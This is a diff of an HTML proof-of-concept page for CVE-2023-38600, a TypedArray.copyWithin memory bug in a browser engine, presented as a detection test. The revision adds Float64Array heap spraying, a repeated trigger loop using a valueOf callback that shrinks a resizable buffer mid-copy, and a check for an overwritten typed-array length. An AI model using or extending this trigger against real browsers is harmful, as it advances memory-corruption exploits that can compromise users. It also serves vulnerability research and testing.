@@ -1,27 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CVE-2023-38600 Detection PoC</title>
+    <title>CVE-2023-38600 - Enhanced Detection</title>
     <script>
         function log(msg) {
             document.body.innerHTML += msg + "<br>";
         }
 
         window.onload = () => {
-            log("Starting CVE-2023-38600 exploit...");
+            log("Starting enhanced CVE-2023-38600 test...");
 
-            // Victim array we'll watch for corruption
-            let victim = new Uint8Array(16);
-            victim.set([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]);
-            log("Victim before: " + victim);
-
-            // Heap spraying for feng shui
+            // Spray Float64Arrays to fill heap
+            const sprayCount = 1000;
             let spray = [];
-            for (let i = 0; i < 1000; i++) {
-                spray.push(new Uint8Array(16));
+            for (let i = 0; i < sprayCount; i++) {
+                spray.push(new Float64Array(4)); // Small but aligned size
             }
 
-            // Evil object to resize buffer mid-copyWithin
+            // Create a "watched" array whose length we will check
+            let watched = new Uint32Array(4);
+            watched[0] = 0x11223344;
+            log("Initial watched.length = " + watched.length);
+
+            // Evil object to resize mid-copyWithin
             const evil = {
                 valueOf: () => {
                     buffer.resize(8); // Resize during copyWithin
@@ -29,33 +30,36 @@
                 }
             };
 
-            // Resizable buffer
+            // Resizable ArrayBuffer
             const buffer = new ArrayBuffer(16, { maxByteLength: 0x10000 });
             const view = new Uint8Array(buffer);
 
-            try {
-                view.copyWithin(0, evil, 16); // Trigger bug!
-                log("Exploit finished (no crash).");
-            } catch (e) {
-                log("Exception caught: " + e.message);
+            // Try multiple times to trigger bug
+            for (let i = 0; i < 10; i++) {
+                try {
+                    view.copyWithin(0, evil, 16);
+                    log(`Exploit run ${i+1} finished.`);
+                } catch (e) {
+                    log(`Exception at run ${i+1}: ${e.message}`);
+                    break;
+                }
             }
 
-            // Check if victim was overwritten
-            log("Victim after: " + victim);
-
-            // Compare first few bytes
-            let original = [1,2,3,4,5,6,7,8];
-            let current = Array.from(victim.slice(0, 8));
-            if (!original.every((v, i) => v === current[i])) {
-                log("⚠️ Memory corruption detected!");
+            // Check if watched array was corrupted
+            if (watched.length !== 4) {
+                log("💥 Length was overwritten!");
+                log("New watched.length = " + watched.length);
             } else {
-                log("No memory changes observed.");
+                log("No metadata corruption detected.");
             }
+
+            // Optional: Dump first few values of watched buffer
+            log("watched[0] = " + watched[0].toString(16));
         };
     </script>
 </head>
 <body>
-    <h2>CVE-2023-38600 - TypedArray.copyWithin Integer Underflow</h2>
-    <p>Check console for memory changes.</p>
+    <h2>CVE-2023-38600 Enhanced Test</h2>
+    <p>Testing memory corruption using heap spraying and metadata checks.</p>
 </body>
 </html>
